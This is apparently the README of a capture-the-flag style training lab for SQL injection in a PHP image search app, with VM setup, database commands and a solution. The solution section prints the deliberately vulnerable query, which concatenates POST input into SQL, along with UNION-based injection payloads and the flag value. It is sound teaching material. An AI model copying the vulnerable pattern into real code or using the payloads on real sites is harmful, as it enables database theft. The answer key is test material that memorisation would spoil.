# PHP SQL injection 1 Attack (Pictures)

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

In this lab, we will look at the simplest example of SQL injection in the image search functionality and will try to extract not only images, but some juicy info.


# Setup

*Requirements:*  **2 GB** of disk space for VM.

Put all files in **source** to folder **/var/www/html/**


```bash
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install nginx mariadb-server php-fpm php-mysql
```

```bash
sudo chown www-data:www-data -R /var/www/html/
sudo chmod 755 -R /var/www/html/*
```

#### Manual database setup

```

sudo mysql -e "UPDATE mysql.user SET Password = PASSWORD('12345') WHERE User = 'root'"
sudo mysql -e "DELETE FROM mysql.user WHERE User='';"
sudo mysql -e "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');"
sudo mysql -e "DROP DATABASE IF EXISTS test;"
sudo mysql -e "DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';"
sudo mysql -e "create database pictures";
sudo mysql -e "CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin'";
sudo mysql -e "GRANT ALL PRIVILEGES ON pictures . * TO 'admin'@'localhost'";
sudo mysql -e "FLUSH PRIVILEGES";
sudo mysql -e "create table pictures.pictures(\`id\` int,\`image\` varchar(255),\`category\` varchar(50));";
sudo mysql -e "create table pictures.flag(\`id\` varchar(50));";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('1','animals-1.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('2','animals-2.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('3','animals-3.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('4','animals-4.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('5','animals-5.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('6','animals-6.jpg','animals');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('7','nature-1.jpg','nature');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('8','nature-2.jpg','nature');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('9','nature-3.jpg','nature');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('10','art-3.jpg','art');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('11','art-3.jpg','art');";
sudo mysql -e "insert into pictures.pictures(\`id\`,\`image\`,\`category\`) values ('12','art-3.jpg','art');";
```

####  Set up a flag

```
sudo mysql -e "insert into pictures.flag(\`id\`) values ('SQL_Injection_is_y0ur_Friend');";
```


#### Nginx configure

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;
        index index.php;
        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }

}
```

Reload nginx config
```
sudo service nginx restart
#sudo systemctl restart nginx
```


## How to check that everything works ?

1. Open the main page. You should see the working app. 


## Solution

There is SQL injection

```php

$query="SELECT * FROM pictures where category='" . $_POST['search'] . "'

```
1. Exploit it with SQLMAP.
2. Or put in search box next statement: 
- ```' union select id,id,id from flag -- ``` (whitespace at the end!!)
- ```' union select id,id,id from flag#```